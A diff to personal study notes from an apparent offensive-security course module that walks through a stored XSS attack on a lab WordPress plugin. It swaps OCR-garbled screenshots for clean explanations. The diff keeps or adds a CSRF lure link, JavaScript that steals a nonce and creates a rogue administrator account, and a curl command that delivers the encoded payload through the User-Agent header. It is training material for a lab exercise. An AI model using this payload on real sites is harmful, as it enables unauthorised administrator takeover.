@@ -184,31 +184,16 @@ Excellent! This XSS flaw allowed us to escalate privileges from a standard user 
 
 We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell. We'll cover web shells more in-depth in another Module.
 
-> [!note]- Screenshot
-> ```
-> Figure 29: Inspecting WordPress Cookies
-> ```
+> [!info] Inspecting WordPress cookies
+> In Web Developer Tools → Storage → Cookies, the WordPress session cookies carry the `HttpOnly` flag, so JavaScript cannot read them. Cookie theft is off the table — pivot to the create-admin-user approach.
 
 
-> [!note]- Screenshot
+> [!example] CSRF lure example
+> A malicious link disguised behind harmless text triggers a state-changing action if the victim is already authenticated:
+> ```html
+> <a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000">Check out these awesome cat memes!</a>
 > ```
-> <a href="http: //fakecryptobank. com/send_btc?account=ATTACKER&amount=108000"">Check out
-> ‘these awesome cat memes! </a>
-> Listing 26 - CSRF example attack
-> ```
-
-
-> [!note]- Screenshot
-> ```
-> var ajaxRequest = new XMLHttpRequest();
-> var requestURL = “/wp-admin/user-new.php™;
-> var nonceRegex = /ser” value="([~"]*?)"/g3
-> ajaxRequest .open("GET", requestURL, false);
-> ajaxRequest..send();
-> var nonceMatch = nonceRegex.exec(ajaxRequest .responseText) ;
-> var nonce = nonceMatch[1];
-> Listing 27 - Gathering WordPress Nonce
-> ```
+> WordPress defends against this with a per-request nonce the attacker can't guess — but stored XSS runs inside the admin's page, so it can just read a valid nonce off the DOM.
 
 
 ```sh
@@ -222,20 +207,6 @@ var nonce = nonceMatch[1];
 ```
 
 
-> [!note]- Screenshot
-> ```
-> var params = “action=createuser& wpnonce_create-
-> user="snonce+"&user_login=attacker&email-attacker@offsec. com&pass1-attackerpass&pass2=a
-> ttackerpass&role-administrator”;
-> ajaxRequest = new XMLHttpRequest();
-> ajaxRequest .open("POST", requestURL, true);
-> ajaxRequest .setRequestHeader("Content-Type”, “application/x-www-form-urlencoded”) ;
-> ajaxRequest .send(params) ;
-> 
-> Listing 28 - Creating a New WordPress Administrator Account
-> ```
-
-
 ```sh
 var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
 ajaxRequest = new XMLHttpRequest();
@@ -245,64 +216,8 @@ ajaxRequest.send(params);
 ```
 
 
-> [!note]- Screenshot
-> ```
-> I ISCompress-The lavas | + - ox
-> 
-> « ca ‘© B hitps:ljscompress.com a 2 OF
-> BIKali Linux AX KaliTools Kali Forums  KaliDocs GE NetHunter ML OffensiveSecurty A MSFU # Exploit-0B + GHOB
-> 
-> Copy & Paste avaScriptCode __Uploadavascript Files __Output oO :
-> 
-> var aimsBonuest ~ new ittoReouest:
-> 
-> Var KRHUSSRURL ~ “/ypAGRLn/ User new. ag":
-> 
-> var anseleger = /sar values" ((-"T"7)"79
-> 
-> ‘laatuussd open “CET, reassstU, 12158):
-> 
-> Aipseeniags. send);
-> 
-> war nasslaich ~ oonseBeges.exec(aiaxtanusss. cesmansslass)
-> 
-> Yar nonce = pancebakbttT:
-> 
-> ‘ar parans = factionceresteusers. wpnonce create-user="‘noncer“Guser loginattackerSenailaattackerGoffsec. conspasslaattackerpassé,
-> 
-> passDeattackerpassGroleradninist®atar"s
-> 
-> Blaeisauest = new UMCSaReauasg 0:
-> 
-> AtaxBeausat.open(°POSt", cequeatURL, rue);
-> 
-> Alavieaueat setRenssstuéader "Content-Type", appLication/xmccfacauclescadsd”;
-> 
-> Biawisausat. seno(parans)
-> 
-> Compress javascript
-> 
-> Figure 30: Minifying the XSS attack code
-> ```
-
-
-> [!note]- Screenshot
-> ```
-> function encode_to_javascript(string) {
-> var input = string
-> var output = *";
-> for(pos = @; pos < input.length; pos++) {
-> output += input.charCodeat(pos);
-> if(pos != (input.length - 1)) {
-> output += 7,5.
-> +
-> +
-> return output;
-> 3
-> let encoded = encode_to_javascript(‘insert_minified_javascript’)
-> console. 1og(encoded)
-> Listing 29 - JS Encoding JS Function
-> ```
+> [!info] Minify the attack code
+> Paste the combined nonce-fetch + create-user JavaScript into [jscompress.com](https://jscompress.com/) and click **Compress JavaScript** to collapse it into a single line. Save the minified output — it becomes the input to the encoding step below.
 
 
 ```sh
@@ -323,54 +238,8 @@ console.log(encoded)
 ```
 
 
-> [!note]- Screenshot
-> ```
-> BBKol Lowe AUKaL Tools AEKallForums RP KaliDocs GUNetHunter Offensive Securly AMSFU # Explot-DB 4 GHOB
-> CRC ispecar ECan D Oebager th Nework (Sole tstor OV Petomonce Oi Menoy Stage Hf Acessity @ Conbestor 2G] om X
-> a as Wang Lge big) SS Rags |
-> 2 ~fancon ene in necisttrio)
-> 
-> {Bribes 07 pos < Srout-enaths pose ¢
-> 
-> :
-> ,
-> ie cue = ence 0 Jey var agetenstne RAR RESTOR OIE gg” vate
-> >I q
-> Figure 31: Encoding the Minified JS with the Browser Console
-> ```
-
-
-> [!note]- Screenshot
-> ```
-> kali@kali:~$ curl -i http://offsecwp --user-agent “
-> <script>eval (String. fromCharCode(118, 97 ,114,32,97,106,97,120,82,101,113,117,101,115,116
-> 61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,11
-> 7,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110
-> 101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,3
-> 4,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101
-> 4113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,11
-> 6,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,4
-> 0,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,
-> 103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,11
-> 5,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,
-> 97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,1
-> 01,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101
-> 245,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103
-> 105,110, 61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,
-> 101,114, 64,111,102, 102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,9
-> 9,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,9
-> 7,115,115,38,114,111,108,101,61,97,100, 109,105,110, 105,115,116,114,97,116,111,114,34,59
-> 40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119, 32,88,77,76,72,116,116,112,
-> 82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,11
-> 7,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,1
-> 01,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,11
-> 6,45,84, 121,112,101, 34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119
-> 4119,45,102,111,114,109,45,117,114,108,101,110,99,111, 100,101,100, 34,41,44,97,106,97,12
-> @,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))
-> </script>” --proxy 127.0.0.1:8080
-> 
-> Listing 30 - Launching the Final XSS Attack through Curl
-> ```
+> [!info] Encode in the browser console
+> Paste the `encode_to_javascript` function into the Firefox Web Console, passing your minified one-liner as the argument. It prints the payload as a comma-separated list of UTF-16 char codes. Copy that output for the final `String.fromCharCode(...)` payload.
 
 
 ```sh
@@ -378,104 +247,16 @@ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,11
 ```
 
 
-> [!note]- Screenshot
-> ```
-> a Burp Suite Community
-> 
-> Burp Project Intruder Repeater Window — Help
-> 
-> Dashboord Target _Fiosy intruder Repeater —“Sequencer_—Decoder_—«Comparer——Logger_—‘Extender_—_~Project options
-> 
-> Intercept __HTTPhistory _WebSocetshistory Options
-> 
-> 2 Requesttohtp/loffseowp:80 [1821685016
-> Forward Drop ‘Acton penBronser
-> 
-> Hex we
-> 
-> cet / HITP/LA
-> Host: offsecwp
-> sscript>eval ( String. fromCharCode(118,$7,114, 32, 97,106, 97,120, 82,101,123,117,101, 125,116, 61,110, 101,119,352, 88, 77,76
-> 72,116, 116,112, €2,101,113,117,101,115,116,44,114,101,113,117, 101,115,116, 85, &2,76,61,34, 47,119,112, 45,97,100,109,10
-> 5,110, 47,117,115, 101,114, 45,110, 101,119, 46,112, 104,112, 34,44, 110,111,110, 99, 101, 62,101, 103,101,120, 61, 47,115, 101,12
-> 4,34, 32,118, 97, 108,117,101, 61,36, 40,91, 94, 34, 93, 42,63, 41, 34, 47,103, 59,97,106, 97, 120,62,101,113,117, 101,115,116, 46,1
-> 11,112,101, 110, 40, 34, 71,69, 64, 36, 44,114,101 113,117,101, 125, 116,85,82,76,44, 33,49, 41, 46,97,105, 97,120,82,101,113,12
-> 7,101,115, 116, 46,115, 101, 110, 100,40, 41,59,118, 97,114, 32,110, 111,110,99,101, 77, 97,116, 99, 104,61, 110,111,110, 99, 101.8
-> 2/101, 163, 101,120, 46, 101, 120, 101,99, 40, 97, 105, 97,120.62, 101, 113,127,101, 115, 116, 45,114, 101,115,112, 111,110, 115,101,
-> 4,161,126, 116, 41, 48,116, 111,110,99, 161,61,110, 111,110, 98, 101,77, 97,116, 9, 194, 91, 49,93, 44, 112,97, 114,97, 103,115, 61
-> +34,97,99, 116,105,111, 110,61,99,114,101, 97,116, 101,117, 115,161, 114, 38,95, 119,112, 110,111,110, 93,101, 95,98,114, 101.9,
-> 7,116,101, 45,117,115, 101,114, 61,34, 43,110,111, 110, 99,101, 43, 4, 38,127,125, 101,114, 95,108,111, 103, 105,110, 61, 57,116,
-> 116,97, 39,107, 101,114, 36, 101, 109, 97,105,108, 61, 97,126,116,57,99,107,101,114, 64,111, 102,102,115, 101,99, 46,99, 111,109
-> 38, 112, 57,115,115, 49, 61,97, 116, 116,97,99,107, 101,114, 112,97, 115,125, 38,112,97, 115, 115,50, 61,57,116,116,97,$9,107.2
-> 61,114,112, 97,115,115, 38, 114,111, 108, 101, 61,97, 100,109,105, 110, 105,115,116,114, 97, 116,111,114, 34,59, 40,97,106, 97,12
-> 082,101,113, 117, 101,115,116, 61,110, 101,119, 32, 88,77, 76, 72,116,116, 112,82, 101,113,117, 101, 115,116, 41, 46,111,112, 101
-> 1110, 40, 34, 80,79,.83,64,34, 44,114,101,113,117,101, 125, 116,85, 82,76, 44,33, 48, 4,44, 97, 106,97, 120,62. 101,113,117,101.2
-> 15,116, a6, 115, 101,116, 2,101, 113,117,101, 115,116.72, 101, 7,109, 101,114, 40, 34,67, 111,110,116, 101,110,116, 45,64, 121.1
-> 12,161, 34,44, 3, 97,112,112, 168, 105,99,97,116, 105,111,110, 47,129, 45, 119,119,119, 45, 102,111,114, 108, 45,117,114, 108, 10
-> 1,110,$9, 111,100,101, 100, 34,41, 44, 97, 106, 57,120, 82, 101,113,117, 102,215,116, 46,125, 101, 110, 100, 49, 112,97, 114, 7, 108,
-> 115,41,59))</script>
-> 
-> 4 Accept! 17"
-> 
-> 5 Connection: close
-> 
-> Figure 32: Inspecting the Attack in Burp
-> ```
+> [!info] Inspect the attack in Burp
+> With Intercept on, the outgoing `GET / HTTP/1.1` request to `offsecwp` shows the `<script>eval(String.fromCharCode(...))</script>` payload sitting in the `User-Agent` header. Confirm it looks correct, click **Forward**, then disable Intercept.
 
 
-> [!note]- Screenshot
-> ```
-> Star Offsec — WordPress x - 3 x
-> < > @ © 8 offsecwp we @e=
-> Kali Linux WR KaliTools HN Kali Forums KI KaliDocs WNetHunter Ik OffensiveSecurty ML MSFU # Exploi-D8. 4 GHDB
-> D) Moms O6 Po + na ows. ain Il
-> © Dathbowrd tooues
-> A Posts
-> 2) Media Visitors
-> © Poe “This theme suggests the flowing plug °
-> comments f
-> # popearance
-> 
-> start
-> K Plugins @
-> 
-> Today (pal t3, 2022 v
-> 
-> Past Users Visits
-> BF Setting ' |
-> 
-> * Date and Time ur °
-> 
-> 1 pri’ 3,202959 am '
-> start
-> )
-> 
-> Figure 33: Loading Visitors Statistics
-> ```
+> [!info] Trigger the payload
+> Log in as admin and open the **Visitors** plugin dashboard. The logged entry shows a blank User-Agent (expected — it's wrapped in `<script>` tags rather than displayed), but loading the page executes the stored payload in the admin's session.
 
 
-> [!note]- Screenshot
-> ```
-> Users sec —WordPress - ax
-> « > @ © B offsecwpfwp-adminfusers php Ow 26
-> BIKaliLinux WKaiToots ER KaliForums E) KaliDocs BENetHunter Offensive Security LMSFU «A Expoit-08. # GHOB
-> DV A ofc Oo Po tne way ain
->  Deshboard | ‘Meterereer . .
-> F Post
-> 9) Media Users
-> HF Poses ‘Thistheme suggets the fllowing posi °
-> F comment f
-> . i) )
-> fe Plugin
-> * Butk ato ¥ Change role t ¥ 2ite
-> Ntusers
-> Settings
-> Name Role Posts
-> & Visto
-> Bulk actions v Change roleto v =
-> © cot
-> Figure 34: Confirming that our Attack Succeeded
-> ```
+> [!success] Confirming the attack
+> Navigate to **Users** (`/wp-admin/users.php`). A new `attacker` account now appears with the `Administrator` role — privilege escalation from a low-privilege injection point to full WordPress admin.
 
 ---
 %% graph-links %%
